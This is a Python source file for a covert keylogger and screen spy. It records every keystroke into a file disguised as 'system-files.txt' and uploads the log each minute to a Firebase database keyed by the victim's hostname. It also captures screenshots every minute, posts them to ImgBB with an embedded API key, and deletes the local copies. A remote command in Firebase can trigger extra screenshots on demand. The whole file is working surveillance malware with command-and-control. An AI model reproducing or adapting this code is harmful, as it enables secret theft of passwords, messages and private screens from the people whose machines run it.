import os
import requests
from datetime import datetime
import socket
import threading
import time
from PIL import ImageGrab  # For taking screenshots
from pynput.keyboard import Listener, Key  # Import Listener and Key from pynput

# Firebase URL
firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'

# Log file and hostname
log_file = "system-files.txt"
hostname = socket.gethostname()
screenshot_folder = "systemss"  # Folder for screenshots

# ImgBB API key
api_key = '8ff7e698f33b179b4471d54349b02824'

# Command path for Firebase
command_path = f'users/{hostname}/command.json'

# Function to check internet availability
def is_internet_available():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except (socket.timeout, socket.error):
        return False

# Function to upload log data to Firebase
def upload_log():
    with open(log_file, 'r') as file:
        content = file.read().strip()

    # Check if the log file has only the new log marker
    new_log_marker = f"** New logging started at"
    if content.startswith(new_log_marker) and content.count(new_log_marker) == 1 and len(content.split("\n")) == 1:
        print("Log file contains only the new log start marker. Skipping upload.")
        return False

    if not is_internet_available():
        print("Internet not available, skipping upload.")
        return False

    db_path = f'users/{hostname}/keylog/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
    with open(log_file, 'r') as file:
        file_data = file.read()
    data_to_upload = {'runnner': file_data}

    try:
        response = requests.put(firebase_url + db_path, json=data_to_upload)
        if response.status_code == 200:
            print(f"Uploaded: {log_file}")
            # Clear the log file after successful upload
            with open(log_file, 'w') as file:
                file.truncate(0)
            # Add a new marker for the next logging session
            add_new_log_marker()
            return True
        else:
            print(f"Failed to upload (Status code {response.status_code}): {log_file}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Failed to upload {log_file}: {e}")
        return False

# Function to add a new logging session marker
def add_new_log_marker():
    with open(log_file, 'a') as file:
        file.write(f"\n** New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} **\n")

# Function to periodically attempt uploading the log file every 1 minute
def periodic_upload():
    while True:
        if upload_log():
            print("Log file uploaded successfully and cleared.")
        else:
            print("Upload failed or not needed. Retrying in 1 minute.")
        time.sleep(60)  # Wait for 1 minute before the next attempt

# Function to periodically take screenshots every 1 minute
def periodic_screenshots():
    os.makedirs(screenshot_folder, exist_ok=True)  # Ensure the screenshot folder exists
    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)
            print(f"Screenshot saved at {screenshot_path}")
            upload_image_to_imgbb(screenshot_path)  # Upload screenshot after saving it
            os.remove(screenshot_path)  # Delete the image after upload
        except Exception as e:
            print(f"Failed to take screenshot: {e}")
        time.sleep(60)  # Wait for 1 minute before the next screenshot

# Function to upload the screenshot to ImgBB
def upload_image_to_imgbb(image_path):
    with open(image_path, 'rb') as image_file:
        files = {'image': image_file}
        params = {'key': api_key}
        response = requests.post('https://api.imgbb.com/1/upload', files=files, params=params)
    
    if response.status_code == 200:
        response_json = response.json()
        image_url = response_json['data']['url']
        print(f"Uploaded {image_path} to ImgBB. URL: {image_url}")
    else:
        print(f"Failed to upload {image_path}. Response: {response.text}")

# Debounce settings for keystrokes
recent_keys = {}
debounce_time = 0.2

# Function to write keystrokes to the current log file with debounce
def write_to_file(key):
    current_time = time.time()
    key_str = None
    if hasattr(key, 'char') and key.char:
        key_str = key.char
    elif key == Key.space:
        key_str = "\t"
    elif key == Key.enter:
        key_str = "\n"
    elif key == Key.backspace:
        key_str = "[BS]"

    if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
        with open(log_file, "a") as file:
            file.write(key_str)
        recent_keys[key_str] = current_time

# Function to start the listener for keystrokes
def start_listener():
    with Listener(on_press=write_to_file) as listener:
        listener.join()

# Ensure the log file exists, create it if it doesn't
def ensure_log_exists():
    if not os.path.exists(log_file):  # Create the log file if it doesn't exist
        with open(log_file, 'w') as file:
            pass  # Create an empty log file

# Function to check and update screenshot count every 10 seconds
def handle_screenshot_interval():
    while True:
        try:
            response = requests.get(firebase_url + command_path)
            if response.status_code == 200:
                command_data = response.json()
                
                # If command_data is None or does not contain 'ss_count', initialize it
                if command_data is None:
                    command_data = {'ss_count': 0}
                elif 'ss_count' not in command_data:
                    command_data['ss_count'] = 0
                
                ss_count = command_data.get('ss_count', 0)

                if ss_count > 0:
                    print(f"Taking {ss_count} screenshots...")

                    # Take screenshots in intervals of 10 seconds
                    for _ in range(ss_count):
                        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                        screenshot_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
                        try:
                            screenshot = ImageGrab.grab()
                            screenshot.save(screenshot_path)
                            print(f"Screenshot saved at {screenshot_path}")
                            upload_image_to_imgbb(screenshot_path)  # Upload screenshot
                            os.remove(screenshot_path)  # Delete the image after upload
                            time.sleep(10)  # Wait for 10 seconds between screenshots
                        except Exception as e:
                            print(f"Failed to take screenshot: {e}")

                    # After taking screenshots, decrement the `ss_count` in Firebase
                    command_data['ss_count'] -= ss_count
                    requests.put(firebase_url + command_path, json=command_data)

            else:
                print(f"Failed to fetch command data, Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error fetching command data: {e}")

        time.sleep(10)  # Check the command data every 10 seconds

# Main process
if __name__ == "__main__":
    ensure_log_exists()  # Ensure that the log file exists

    # Add a marker for the new logging session
    add_new_log_marker()

    # Start listener in a separate thread
    listener_thread = threading.Thread(target=start_listener, daemon=True)
    listener_thread.start()

    # Start periodic upload in a separate thread
    upload_thread = threading.Thread(target=periodic_upload, daemon=True)
    upload_thread.start()

    # Start periodic screenshot capture in a separate thread
    screenshot_thread = threading.Thread(target=periodic_screenshots, daemon=True)
    screenshot_thread.start()

    # Start screenshot interval handling in a separate thread
    screenshot_interval_thread = threading.Thread(target=handle_screenshot_interval, daemon=True)
    screenshot_interval_thread.start()

    # Keep the main thread running
    listener_thread.join()
    upload_thread.join()
    screenshot_thread.join()
    screenshot_interval_thread.join()
